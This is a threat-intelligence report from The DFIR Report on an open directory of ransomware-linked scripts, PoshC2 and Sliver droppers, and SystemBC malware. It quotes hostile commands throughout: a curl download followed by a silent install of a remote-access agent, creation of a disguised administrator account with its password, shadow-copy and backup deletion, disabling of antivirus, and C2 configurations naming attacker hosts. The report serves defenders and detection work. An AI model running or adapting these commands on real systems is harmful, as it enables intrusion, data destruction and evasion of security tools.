---
title: "Threat Actors' Toolkit: Leveraging Sliver, PoshC2 & Batch Scripts - The DFIR Report"
source_url: "https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/"
published: "2024-08-12T01:46:57+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2024-08-12_threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts.html"
---

# Threat Actors' Toolkit: Leveraging Sliver, PoshC2 & Batch Scripts - The DFIR Report
## Key Takeaways

- In early December of 2023, we discovered an open directory filled with batch scripts, primarily designed for defense evasion and executing command and control payloads. These scripts execute various actions, including disabling antivirus processes and stopping services related to SQL, Hyper-V, security tools, and Exchange servers.

- This report also highlights scripts responsible for erasing backups, wiping event logs, and managing the installation or removal of remote monitoring tools like Atera.

- Our investigation uncovered the use of additional tools, including Ngrok for proxy services, SystemBC, and two well-known command and control frameworks: Sliver and PoshC2.

- The observed servers show long term usage by the threat actors, appearing in The DFIR Report Threat Feeds as far back as September 2023. They have been active intermittently since then, with the most recent activity detected in August 2024.

- Ten new sigma rules were created from this report and added to our private sigma ruleset

An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon .

## The DFIR Report Services

- Private Threat Briefs : Over 20 private DFIR reports annually.

- Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.

- All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, opendir reports, long-term tracking, data clustering, and other curated intel.

- Private Sigma Ruleset : Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.

- DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.

Contact us today for pricing or a demo!

Table of Contents:

- Summary

- Analysts

- Adversary

- Infrastructure

- Capability

- Victim

- Indicators

## Summary

In this report, we delve into an open directory on 94.198.53.143, first observed on December 10, 2023, during our intelligence collection process. Prior to the open directory appearing, this address had appeared in our threat intelligence feeds for PoshC2 command and control. It first appeared on September 21, 2023 and has been intermittently active, most recently on August 11, 2024, showing that the infrastructure is being utilized over a long timeframe.

Besides PoshC2, the threat actor identified utilized a range of batch scripts and malware to compromise both Windows and Linux systems. Their toolkit featured scripts such as atera_del.bat and atera_del2.bat to remove Atera agents, backup.bat and delbackup.bat to delete system backups and shadow copies, and clearlog.bat to erase Windows event logs and associated data.

The actor employed cmd.cmd to disable User Account Control and modify registry settings, while scripts like def1.bat and defendermalwar.bat are used to disable Windows Defender, scheduled tasks, and uninstall Malwarebytes. They also utilized tools such as Ngrok for proxy purposes, Posh_v2_dropper_x64.exe for PowerShell-based command-and-control operations, and VmManagedSetup.exe, which contains SystemBC malware.

The threat actor further disrupted systems by stopping and disabling various critical services, using scripts like disable.bat and hyp.bat, and logging off user sessions with LOGOFALL.bat and LOGOFALL1.bat. Their overarching goal appeared to be system compromise, data destruction, and evasion of detection mechanisms.

During our investigation, we pivoted using Shodan and identified the name ‘PoshC2’ linked to port 443 among the open ports. Further exploration using the HTTP HTML hash filter (http.html_hash:-1700067737) revealed a second IP address, 185.234.216.64:8000, with another open directory containing binaries closely matching those found at the first IP address.

Within the second open directory at 185.234.216.64:8000, we discovered a text file named poshc2+user.txt that outlined the creation of a user account by misspelling ‘WDAGUtilityAccount’ as ‘WDAGUtilltyAccount’. The script also included instructions for downloading the .MSI version of the Atera Agent using the email ‘ [email protected] ’.

Although the open directory at 94.198.53.143:8000, located in Russia, has been taken down, various security vendors, including the DFIR Report, continue flagging this IP for PoshC2 activity. As of August 11, 2024, the second IP, 185.234.216.64:8000, remains accessible, indicating the threat actor’s continued use of this directory to host malicious batch scripts and binaries, leveraging PoshC2 and Sliver as their primary command-and-control tool kits.

Compared to our last open directory report , no data was present to indicate victims or targeting information. However, based on the tools presented we can conclude with medium confidence that these servers were used in ransomware intrusion activity–seeing many scripts looking to kill or stop services, delete backups and shadow copies, and disable or remove antivirus software.

## Analysts

Analysis and reporting completed by r3nzsec , 0xtornado & 0xThiebaut

## Adversary

In the second open directory discovered via pivoting techniques, we observed a text file named ‘poshc2+user.txt’. This file detailed the creation of a user account, masquerading as the default Windows account ‘WDAGUtilityAccount’ but with an extra ‘l’, becoming ‘WDAGUtilltyAccount’. The script also included instructions to download the .MSI version of the Atera Agent using curl and a login of ‘ [email protected] ’, which appears to be a legitimate email address associated with an Atera Agent account.

## Infrastructure

During our analysis of the IP address hosting the open directory, 94.198.53.143, we found it associated with PoshC2. Using external data sources like VirusTotal revealed several connections, including file communications, downloads, URLs, and notably, collections of Command and Control (C2) frameworks. As illustrated in the screenshot provided, this IP address was linked to two distinct C2 frameworks: ‘PoshC2’ and ‘Sliver’. These two command & control (C2) frameworks are available for download on GitHub and are commonly utilized by penetration testers and red team professionals as part of their assessments and simulations.

- Posh C2 – https://github.com/nettitude/PoshC2

- Sliver – https://github.com/BishopFox/sliver

However, we have also observed that these two opensource tools are being used by threat actors.

We then proceeded to dig deeper into the open directory IP (94.198.53.143) using Shodan, to look around and see if we could find useful pivots, and additional information. A quick look into the information below, shows that this IP had multiple open ports: 80, 123, 443, 1337, 8000, 8443

Scrolling down the list of open ports, we noticed the name “PoshC2” associated with port 443. As this looked to be of interest in our investigation, we looked into the http html hash “http.html_hash:-1700067737” and used this as a new query to look around.

Upon searching for that http.html_hash, we found another IP 185.234.216.64.

This IP (185.234.216.64) was also based in Moscow, Russia, with 3 open ports: 123, 443, and 8000.

Checking out the open ports, we observed that port 8000 had an HTTP status code of 200, which hinted that this might still be active and accessible.

Upon further investigation, we discovered another active PoshC2 open directory with nearly identical batch and executable files to those found on the initial PoshC2 IP. This discovery was made through a simple pivot in Shodan. We retrieved files from this new open directory (185.234.216.64:8000) on two occasions: March 1, 2024, and June 29, 2024. Notably, the latest retrieval contained more files than the first one. However, the most interesting part of the March version of the open directory was the ‘poschc2+user.txt’ file, which we managed to retrieve before it was deleted by the threat actor.

### The DFIR Report Threat Feed Data

The DFIR Report threat intelligence team has been monitoring these IP addresses for their involvement in various command and control frameworks for our Threat Feeds , prior to our investigation into the open directory.

The IP address 94.198.53.143 was first detected on September 21, 2023, and has since shown intermittent activity. It has been primarily associated with PoshC2 and Sliver, with a single instance linked to Empire. The infrastructure’s use of different command and control frameworks is sporadic, but it is regularly reactivated, with the most recent activity occurring in August 2024.

The IP address 185.234.216.64 has been exclusively associated with PoshC2 activity. It has been intermittently used from October 2023 through August 2024.

## Capabilities

This next section will cover the different tools/scripts in the open directory. Below is a short summary of each of the files, which we will then cover in more detail.

atera_del.bat/atera_del2.bat

- This batch script is for removing Atera remote management agent.

backup.bat

- This batch script is used to delete all system state and general backups, remove all shadow copies, and ignore all boot failures.

clearlog.bat

- This batch script to delete Windows event logs that also delete recycle bin and registry keys related to terminal server client.

cmd.cmd

- This file disables UAC, modifies registry settings, including RDP settings.

def1.bat

- This batch script disables Windows Defender and scheduled tasks.

defendermalwar.bat

- This batch script disables Windows Defender, altering user account control settings and uninstalling Malwarebytes.

delbackup.bat

- This batch script, which deletes all system state backups, backup catalogs, shadow copies, and alters boot configuration setting to ignore failures.

disable.bat

- This batch script stops and disables services related to Microsoft SQL & Exchange, various database services, and additional system services on a Windows server/workstation.

hyp.bat

- This batch script deletes various Hyper-V, SQL, and Firebird server services. It also stops a wide range of system and third-party services in Windows machines.

LOGOFALL.bat

- This batch script lists all user sessions, and logs off each session except the first one.

LOGOFALL1.bat

- This batch script attempts to log off all sessions up to the 20th session, excluding the user’s current session.

NG1.bat

- This batch script contains a Ngrok authentication token that runs on port 3389 (RDP).

NG2.bat

- This batch script that contains a Ngrok authentication token that runs in the same port, 3389 (RDP).

Ngrok.exe

- This is a legitimate tool, which can, and was, abused for proxy purposes.

ON.bat

- This batch script to ensure that the network services are running and set to start automatically.

Posh_v2_dropper_x64.exe

- The PoshC2 dropper, a PowerShell-based C2 executable.

native_dropper

- The Linux version of Posh_v2_dropper_x64.exe.

poshc2+user.txt

- The text file with PowerShell one-liners to execute PoshC2 agent and perform further post-exploitation actions.

py_dropper.sh

- Bash shell script to execute a python dropper for PoshC2.

Setup_uncnow.msi

- Atera remote admin tool installer.

shadow.bat / shadowGuru.bat

- This batch script consists of multiple registry key deletions pertaining to security tools, including the creation of network shares for multiple disk drives while granting full access permissions to everyone.

VmManagedSetup.exe

- SystemBC malware executable.

WILD_PRIDE.exe

- Sliver C2 framework executable.

z.bat

- This batch script is to remove services and processes associated with Hyper-V, multiple AV programs, SQL, and other specific services.

z1.bat

- Huge scripts to automate the disabling of processes, services, registry modification, and a lot of defense evasion techniques.

### atera_del.bat/atera_del2.bat

The main goal of this batch file is to remove and uninstall Atera software, including the registry keys, services, and directories associated with Atera Agent installation. The exact commands observed in atera_del.bat have been seen in many public resources as a known way to uninstall/delete Atera from a system.

- https://www.reddit.com/r/syncro/comments/pf85te/working_script_for_removing_atera_agent/

- https://www.cliftonsystems.co.uk/atera-removal-script/

- https://patrickdomingues.com/2022/01/19/how-to-uninstall-atera-agent-software/

The first line command is to silently uninstall the software associated with the given product code via msiexec, which in this case, is the product code dedicated to Atera. The command line parameter “/x” is used to uninstall a program, while the “/qn” means quiet mode to uninstall Atera silently without any prompts to the user.

The timeout command is used to ensure a slight pause (5 secs) after the uninstallation command is executed, possibly to allow for proper completion of the Atera uninstall process before proceeding to any subsequent commands in the batch file.

The sc command is also used, first to stop and then completely remove the AteraAgent service, all done silently without showing any output to the user with the help of “ > nul 2> nul ” commands.

The taskkill command is used to terminate a specific process, which in this case is the TicketingTray.exe. TicketingTray.exe is part of the AteraAgent software commonly used to display the Atera Icon on the system.

The REG command is used to force “ f ” delete the registry keys related to Atera Networks

RMDIR command silently and recursively deletes the “TrayIconCaching” directory in the current user’s local temporary files. “ /S ” removes all directories and files in the specified directory in addition to the directory itself, while “ /Q ” stands for ‘quiet mode’ and does not prompt for confirmation.

The RMDIR command is used again to delete the installation folders of “ATERA Networks” from both the standard “Program Files” and “Program Files (x86)” directories.

### backup.bat

These commands are intended to prevent data recovery, delete the volume shadow copies, and configure system boot settings, all making it more difficult to restore.

[W]badmin is a command-line utility for Windows backup and restore. The DELETE SYSTEMSTATEBACKUP arguments are used to delete system state backups. The flag-keepVersions:0 specifies that no versions of the system state backups should be kept, essentially deleting all existing system state backups. Next, the script runs wbadmin again. Similar to the previous command, this one is for deleting regular backups (not just system state backups).

[W]mic is another command-line utility used to interact with Windows Management Instrumentation (WMI) that can be used to delete volume shadow copies

The vssadmin command is used for the deletion of a specified volume’s shadow copies. In this case, it uses the “/All’ parameter which deletes all shadow copies on the system. Shadow copies are used by Windows for backups and system restores. At the end the tool is used again to confirm shadow deletion.

[B]cdedit.exe is then used to disable WINDOWS automatic recovery features by modifying boot configuration data.

### clearlog.bat

This batch script checks if the user has administrative privileges and clears event logs in Windows. The IT community commonly uses portions of these commands, as seen in these posts in several IT forums many years ago.

- https://answers.microsoft.com/en-us/windows/forum/all/clear-all-administratative-event-logs-in-event/17c5fba6-dc5e-4acd-9db0-e20665ce3ad5

- https://www.get-itsolutions.com/commands-clean-recycle-bin/

Let’s break down each phase of the codes and discuss the functionalities of it.

- The @echo off command line hides the command execution output from the console itself while setting a timer for 60 seconds using the timeout /T 60

- FOR /F “tokens=1,2*” %%V IN (‘bcdedit’) DO SET adminTest=%%V is a loop that iterates through the output of bcdedit command that shows boot configuration data and searches for lines containing:

- IF (%adminTest%)==(Access) goto noAdmin, this conditional statement checks if the admintest variable is equal to “Access”. If it is, the execution jumps to the noAdmin label, effectively skipping the log-clearing process.

- This command has a loop that iterates through the output of wevtutil.exe el command, which lists event logs and, for each line, calls the :do_clear subroutine with the line’s content as an argument.

- The line echo clearing%1 prints a message indicating which event log is being cleared. The %1 placeholder is replaced by the actual log name passed from the main loop.

- [W]evtutil.exe cl %1 clears the specific event log identified by the %1 argument.

- This line of command clears out the $Recycle.bin directory from the system partition.

The above commands are used to delete the Remote Desktop Protocol traces found on the host artifacts. During our usual analysis, these are the artifacts that are commonly left by the threat actor for us to identify the RDP related activities as part of their lateral movement.

- These commands attempt to delete registry keys related to remote desktop settings under the current user’s profile, where the following options were used:

- /va: Deletes all values associated with the key

- /f: Forces the deletion, even if the key is protected

- cd %userprofile%\documents\ this command will perform a change directory to the documents folder using the user profile where default.rdp is commonly stored. Default.rdp typically stores the settings for the RDP connections.. As default.rdp is a hidden file that is stored for each user, attrib Default.rdp -s -h needs to run ( “-s” removes the “System” attribute from the file while “-h” removing the “hidden” attribute) for it to become visible. Once visible, the command del Default.rdp will execute the deletion of the file as part of the threat actor’s deletion of RDP traces.

### cmd.cmd

The script above describes itself with its comments. The script is meant to disable User Account Control (UAC), backdoor the Sticky Keys, Utilman, and other accessibility features with cmd.exe , and disable Network Level Authentication (NLA) .

Running this script would allow the threat actor to access the Windows sign-in screen without authentication and run commands using the backdoor accessibility tools in the system context.

### def1.bat

The following batch script is another defense evasion script that provides several commands to disable Windows Defender.

- The first part of this script adds a dozen registry keys to disable several components of Windows Defender including Real-Time Protection, SpyNet, and MpEngine.

- The second section of the script tries to disable registry keys related to ETW tracing and logging.

- The third section disables multiple scheduled tasks related to Windows Defender.

- In the fourth area, the script works to remove various GUI access for Windows defender, particularly the system tray icon and the context menu access for things like on demand scanning.

- The fifth part of this script is using PowerShell to add the whole volumes (C:\, D:\, E:\, and F:\) as an exclusion path for Defender.

- The sixth part then sets registry values to disable various Windows Defender services.

### defendermalwar.bat

This batch script executes several commands designed to disable various Windows Defender registry keys and alter User Account Control settings. WMIC command was also used in the last part of the script to uninstall Malwarebytes.

The commands above were used to modify the registry key settings related to UAC on a Windows system. Let’s dissect each one of these:

- PromptOnSecureDesktop, setting this value to 0 disables the secure desktop when UAC prompts appear. Disabling this feature means UAC prompts will appear on the user’s current desktop, which could be less secure as some malware might interact with or spoof the UAC prompt.

- EnableLUA, setting this value to 1 enables Limited User Account (LUA) capabilities, the underlying technology for UAC.

- ConsentPromptBehaviorAdmin, setting this to 0 modifies the behavior of UAC prompts for administrative users. In this mode, when actions requiring administrative privileges are performed, the UAC prompt will not ask for consent (or credentials on standard user accounts)

These commands collectively disable various Windows Defender security settings, including real-time protection and behavior monitoring.

These PowerShell commands remove the Windows Defender feature, forcefully restart the Windows Defender service, and forcefully restart the Windows Firewall service.

The last part of the commands contain wmic (Windows Management Instrumentation Commandline) to silently uninstall any products whose names contain ‘Malwarebytes’.

### delbackup.bat

Just like the other script (backup.bat), it primarily focuses on removing backup and system restore points from a Windows system, disabling recovery options, and modifying the boot configuration to ignore failures. It uses command-line utilities like wbadmin, wmic, vssadmin, and bcdedit to delete existing backups, shadow copies, and system state backups, and then alters the system’s boot settings to prevent automatic recovery actions in case of errors. Lines one through seven repeat the same actions observed in the prior discussed script.

- cmd.exe /C wbadmin STOP job: Stops any backup jobs currently running.

- cmd.exe /C wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet: Deletes all the backups of system files and settings without leaving any copies.

- cmd.exe /C wbadmin DELETE CATALOG -quiet: Removes the record of all backups so the system no longer knows they existed.

- cmd.exe /C wbadmin DISABLE backup: Turns off the backup schedule, so no more automatic backups will be made.

- cmd.exe /C bcdedit /set {default} recoveryenabled No and cmd.exe /C bcdedit /set {default} bootstatuspolicy ignoreallfailures: These commands make the computer ignore errors during startup and stop trying to fix them automatically.

The last part of the script automates the deletion of all shadow copies (backup snapshots) on a Windows system and then removes itself. First, it changes the directory to the one containing the script, then, creates and executes a command sequence through diskshadow, to delete the shadow copies; and finally, deletes the command file and the script itself, after pausing for user input.

### disable.bat

This batch script contains 398 lines of code and can kill processes and disable multiple services including web servers, databases, and exchange services. Examples of commands used are:
net stop MSExchangeDelivery sc config MSExchangeDelivery start= disabled net stop MSExchangeDiagnostics sc config MSExchangeDiagnostics start= disabled net stop MSExchangeEdgeSync taskkill -f -im sqlbrowser.exe taskkill -f -im sqlwriter.exe taskkill -f -im sqlservr.exe taskkill -f -im msmdsrv.exe taskkill -f -im MsDtsSrvr.exe
The script also deletes many AV services, including Trend Micro, ESET, and Kaspersky:

Its noteworthy that the threat actor mistyped Delete ( Delite ) multiple times in the script comments, this could indicate that English may be a second language for this threat actor.

An additional capability of this script, its disabling and deleting of Volume Shadow Copies (vssadmin.exe Delete Shadows /All /Quiet), suggests that it is meant to be used during ransomware attacks, to accelerate the encryption and prevent the victim from recovering the files. Similar scripts have been reported in a number of our ransomware reports.

### hyp.bat

The name of this batch script suggests it is a Hyper-V-related tool. The script has more than 100 lines and starts with the following commands to delete Hyper-V services:

The script also deletes two services related to FireBird:

Firebird is an open-source SQL relational database system that offers high performance, scalability, and robust features.

The rest of the script overlaps with the files we’ve previously analyzed in this report, disabling different database services and killing their processes.

### LOGOFALL.bat

This script is one of the shortest scripts in the threat actor’s toolkit. It has a straightforward functionality:

The query session command queries the current sessions on the system and saves the results to a text file. The batch script then iterates over the text files skipping the first line and extracting the session IDs from the 3 token (column). The sessions are then logged off using the session IDs obtained, and the text file is deleted.

### LOGOFALL1.bat

This script is similar to LOGOFALL1.bat and serves the same objectives. This enhanced version logs off the users or sessions that didn’t meet the current condition only.

if /i “%%b”==”%username%” checks if the second token (session name) is equal to the current username (%username%). If the session name matches the current user, the session ID (%%c) is stored in the variable curID.

This following line for /L %%C in (0,1,20) do if “%%C” neq “%curID%” logoff %%C initiates a for /L loop that iterates from 0 to 20. For each value of %%C, it checks if the value does not equal to the current session ID stored in %curID%. If the session ID doesn’t match the current session ID, it logs off the session with the ID %%C.

### NG1.bat

This batch script contained three lines of ngrok configuration:

The ngrok config add-authtoken command saves the ngrok authtoken to the configuration file. While ngrok tcp can be used to start a TCP tunnel, which forwards all traffic on a public port to a local server (RDP in this case), it is also extremely useful for exposing services that run non-HTTP traffic (SSH, SIP, RDP, RTSP, GRPC, game servers, etc).

### NG2.bat

This script is similar to the first ngrok script NG1.bat. Only the authentication token differs:

### ngrok.exe

This binary is legitimate and signed ngrok agent .

Some AV vendors tag it as malicious with a PUP category. The presence of this binary in your environment can be a great indicator of compromise if you are not using it.

### ON.bat

This type of command was used by Blackbyte, Promethus, Phobos and other ransomware groups as part of their playbook to perform configuration on several services. Aside from starting multiple services using net start command, below are the configuration changes using sc command

sc.exe config Dnscache start= auto

- Caches DNS names and registers the full computer name for your computer

sc.exe config SSDPSRV start= auto

- Enables discovery of UPnP devices on your home network

sc.exe config FDResPub start= auto

- Publishes your computer and resources attached to your computer so they can be discovered over the network

sc.exe config upnphost start= auto

- Allows UPnP devices to be hosted on your computer

References:

https://www.linkedin.com/pulse/english-blackbyte-ransomware-misterious-dropper-encoder-fasolo

https://www.cybereason.com/blog/research/cybereason-vs.-prometheus-ransomware

https://blog.talosintelligence.com/understanding-the-phobos-affiliate-structure

### PoshC2

The Posh_v2_dropper_x64.exe is, as its name states, a PoshC2 dropper. Specifically, the sample is a C++ CLR ( Common Language Runtime , a.k.a. .NET) loader which executes a PoshC2 PowerShell Dropper with the below reconstructed configuration.
{ "ConnectURL": "/webhp/", "Key": "bX7WACSlpm2NpvJdQbRV8DHAjmEJpKWM8n4bkG6bzCI=", "KillDate": "2999-12-01", "URLID": 1, "PayloadCommsHost": "https://94.198.53.143", "StageRetriesLimit": 30, "StageRetries": true, "StageRetriesInitialWait": 60, "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36" }
The usage of the default kill date and TLS certificate (besides all other tools and “geographic” location) are common indications of the C2 being adversary instead of red team infrastructure. At the time of writing, the Posh Command & Control service is still actively responding.

Hunting for additional PoshC2 infrastructure can be done through the default TLS certificate settings .

### native_dropper

native_dropper is the Linux version of Posh_v2_dropper_x64.exe, which is the Windows version of it. By checking the hash of this file ( 63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d ), we can see that it is now flagged by most of the AV vendors as malicious with 58/72 ratings.

Performing a quick string reveals the configuration of this PoshC2. Packetwatch also discussed it on their blog last year.
domain_front_hdr=94.198.53.143 server_clean=https://94.198.53.143 ua=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36 proxy_url= proxy_user= proxy_pass= urls=webhp/ urls=adsense/troubleshooter/1631343/ urls=trader-update/history&pd=/ urls=status/995598521343541248/query=/ urls=uasclient/0.1.34/modules/ urls=utag/lbg/main/prod/utag.15.js/ urls=GoPro5/black/2018/ urls=usersync/tradedesk/ urls=bootstrap/3.1.1/bootstrap.min.js/ urls=TOS/ urls=business/home.asp&ved=/ urls=web/20110920084728/ urls=vssf/wppo/site/bgroup/visitor/ urls=Philips/v902/ urls=bh/sync/aol/ urls=async/newtab/ urls=advanced_search/ urls=adServingData/PROD/TMClient/6/8736/ urls=vfe01s/1/vsopts.js/ urls=cisben/marketq/ urls=business/retail-business/insurance.asp/ urls=client_204/ urls=branch-locator/search.asp/ urls=work/embedded/search/ urls=babel-polyfill/6.3.14/polyfill.min.js=/ urls=cdba/ urls=putil/2018/0/11/po.html/ urls=qqzddddd/2018/load.php/ urls=types/translation/v1/articles/ urls=classroom/sharewidget/widget_stable.html/ jitter=0.2 sleep_time=5 kill_date=32501019600

### poshc2+user.txt

While analyzing the files, the ones we observed on the second IP after pivoting with Shodan (185.234.216.64:8000), one additional thing that caught our attention was the poshc2+user.txt file. Let’s take a look at the content of this text file.

The text file contains multiple commands that we will be dividing into four parts:

1: PowerShell encoded commands

Below are the PowerShell decoded commands. The download link mentioned on the below decoded commands is not accessible anymore.

2: Creation of User Account

The below commands are used to create a user account “WDAGUtil l tyAccount” with a password of “Ujmqaz5055”. After creating this account, it will be added to the administrator local group. Notice that this user was trying to masquerade the common system account in Windows “WDAGUtilityAccount” with a little typo of “l” instead of “i”.
net user WDAGUtilltyAccount Ujmqaz5055 /add net localgroup Administrators WDAGUtilltyAccount /add
3: Enable Remote Desktop Protocol

These commands are divided into two parts. The first one is registry modification, which is used to enable Remote Desktop Protocol (RDP) on a Windows machine by setting the value of “fDenyTSConnections” to “0”. The second command manipulates and configures the Windows Firewall to allow inbound RDP connections by opening TCP port 3389.
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
4: Download and Install Atera Agent

The provided commands utilize ‘curl’ to download the Atera Agent installation setup file, specifying the necessary Gmail and account ID. Upon executing the entire command sequence, the ‘setup.exe’ file for the Atera Agent was successfully downloaded without encountering any issues.
curl -o setup.msi "https://HelpdeskSupport613811560.servicedesk.atera.com/GetAgent/Msi/?customerId=1& [email protected] &accountId=<redacted>" && msiexec /i setup.msi /qn [email protected] CompanyId=1 AccountId=<redacted>

### py_dropper.sh

This script is an encoded PoshC2 Python payload dropper.

Decoding the base64 encoded blob results in the following Python script:

This script is a configured version of https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.py . Decoding it gives us several insights and IOCs (C2 IP, callback URLs, UA) on the threat actor’s infrastructure and methods. The configuration of settings in this sample, match the same ones observed in the prior samples mentioned, indicating that they were generated during the same server build.

### setup_uncnow.mmsi

This installer deploys the Atera agent, which is part of a remote monitoring and management tool. This tool has commonly misused by various threat actors for intrusions.

### shadow.bat

Contrary to what the script name indicates, this script focus on more than just Volume Shadow Copies.

The script uses two commands vssadmin.exe Delete Shadows /All /Quiet and vssadmin delete shadows /all to delete all shadow copies of files and folders on the system.

The script also performs multiple defense evasion techniques by disabling Windows Defender, enabling RDP, and backdooring the system by replacing the accessibility features by cmd.exe as previously seen in cmd.cmd script.

### shadowGuru.bat

This script has two main functions. It first uses the net share command to share several drives with full access permissions to everyone on the network:

Then, it uses a condition to perform several registry cleanups and modifications related to AV programs:

The conditional statement is based on the system architecture PROCESSOR_ARCHITECTURE check, and make registry modifications accordingly. Depending on whether the system is 32-bit or 64-bit, registry changes are made using appropriate paths (/reg:32 or /reg:64).

### VmManagedSetup.exe

The VmManagedSetup.exe executable was identified as SystemBC, a malware strain known to perform initial reconnaissance and deliver follow-up malware on select targets. Upon starting, the malware immediately persists itself.

This SystemBC sample does so through run-key persistence. Specifically, it creates the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key of value socks5, intended to execute the sample through PowerShell. While this approach is far from stealthy, SystemBC is known to infect miss-managed corporate devices, often lacking security software.

After persistence has been established, SystemBC launches its main thread. As shown below, SystemBC starts by launching a separate kill-switch thread, listening locally to avoid concurrent runs. The malware then periodically beacons, alternating between two C2s.

To evade detection, SystemBC ensures its configuration is only decrypted to establish the C2 connection. The malware supports both IPs and host names as C2 addresses.

The XOR-decoded configuration exposes both SystemBC servers as 94.198.55.181:4337 and 94.198.51.247:4337.
00000000 42 45 47 49 4e 44 41 54 41 48 4f 53 54 31 3a 39 |BEGINDATAHOST1:9| 00000010 34 2e 31 39 38 2e 35 35 2e 31 38 31 00 00 00 00 |4.198.55.181....| 00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000030 00 00 00 00 00 00 00 48 4f 53 54 32 3a 39 34 2e |.......HOST2:94.| 00000040 31 39 38 2e 35 31 2e 32 34 37 00 00 00 00 00 00 |198.51.247......| 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000060 00 00 00 00 00 50 4f 52 54 31 3a 34 33 33 37 00 |.....PORT1:4337.| 00000070 00 |.|
As SystemBC’s main functionality is to deploy additional malware, its download logic provides additional IoCs. As outlined below, the VmManagedSetup.exe executable is capable of fetching additional payloads using a GET request over HTTP/1.0. The employed user agent is:
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0

Its noteworthy that the download functionality relies on the default hard-coded port INTERNET_DEFAULT_HTTP_PORT, indicative of plain HTTP communications on port 80. These types of communications typically empower organizations to detect suspicious activity through network appliances.

Reference:

- https://www.virustotal.com/gui/file/cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2/detection

### WILD_PRIDE.exe

The WILD_PRIDE.exe executable is a Sliver implant, an open-source adversary “emulation” framework. As the Sliver framework is written in Go and obfuscated using garble , relying on dynamic analysis provides the easiest method for C2 identification, which for this sample is the 94[.]198[.]53[.]143 open-directory server.

Sliver relies on Protobuf to serialize command & control communications, which luckily, aren’t as easily obfuscated. By performing a string analysis against the project’s Protobuf definitions (identifying included and excluded changes in protobuf/sliverpb/sliver.proto), we were able to scope down the implant version to likely 1.5.40 or 1.5.41, released mid-2023 to address CVE-2023-34758 .

Reference:

https://www.virustotal.com/gui/file/1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed/detection

https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/

### z.bat

This script contains 242 lines of code that mainly performs the deletion of services. These are divided into some of the different AV vendors, Hyper-V, and SQL, based on the below categories.
rem Delite Service "Hyper-V" rem Delite Service "AVG" rem Delite Service "Malwaresbytes" rem Delite Service "Sofos" rem Delite Service "Fire_Bird" rem Delite Service "SQL" rem Delite Service "AV: Webroot" rem Delite Service "AV: ESET" rem Delite Service "AV: Kaspersky" rem Delite Service "AV: Quick Heal" rem Delite Service "AV: McAfee" rem Delite Service "AV: Trend Micro" rem Delite Service "AV: Panda"
Aside from deletion of services, it also performs the killing of multiple processes.
rem Kill rem Kill "AV: Trend Micro" rem Kill "SQL"

These commands are used to check if specific antivirus or endpoint security services are running on a Windows system.

- tasklist /fi “imagename eq MsMpEng.exe”: This checks if the process for Windows Defender (MsMpEng.exe) is running.

- | find /c “PID”: This part filters the previous command’s output, counting how many lines contain the term “PID” (a way to check if the process was found).

- && Echo Windows Defender: If the previous command found the process (meaning Windows Defender is running), this part will display “Windows Defender”.

The same structure applies to the other lines, but they check for different processes:

- MBCloudEA.exe & MBAMService.exe – Malwarebytes

- ntrtscan.exe – Trend Micro Security.

- avp.exe – Kaspersky Endpoint Security.

- WRSA.exe – Webroot.

- egui.exe – ESET.

- AvastUI.exe f – Avast.
TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
The last command on this script is used to forcefully stop all processes with a PID of 1000 or higher, except those whose window titles start with “untitle”.

### z1.bat

This is by far the most extensive script on this opendir, and it contains over 772 lines of commands. It has exactly the same content of the previous script (z.bat) with additional defense evasion techniques and capabilities.
rem Delite Service "Hyper-V" rem Delite Service "AVG" rem Delite Service "Malwaresbytes" rem Delite Service "Sofos" rem Delite Service "Fire_Bird" rem Delite Service "SQL" rem Delite Service "AV: Webroot" rem Delite Service "AV: ESET" rem Delite Service "AV: Kaspersky" rem Delite Service "AV: Quick Heal" rem Delite Service "AV: McAfee" rem Delite Service "AV: Trend Micro" rem Delite Service "AV: Panda"
The first part of the script deletes services targeting well-known security AV vendors, as well as services related to Hyper-V and Microsoft SQL.

Second part of the script is to stop multiple services related to MS SQL, as well as disable the related services via “sc config” command.

These commands delete registry entries for various antivirus and security services from the Windows Registry. By targeting the HKLM\SYSTEM\CurrentControlSet\services\ path, they remove configurations for security software such as Kaspersky, Malwarebytes, McAfee, Norton, Avast, AVG, Avira, and many others, effectively disabling these services.

This part of the script has already been discussed in previous scripts. These are mainly related to Windows settings to enable Remote Desktop, adjust firewall rules, alter the behavior of certain utility programs, and change security policies. Specifically, they allow Remote Desktop connections, create a firewall rule to allow incoming Remote Desktop traffic, and replace the functions of various accessibility tools and Help features with the Command Prompt. Additionally, they disable UAC and Windows Defender and modify Remote Desktop, potentially weakening system security.

## Victim

During the analysis of the open directories identified in this investigation no information was discovered relating to targeting or victims.

## Indicators

### Atomic
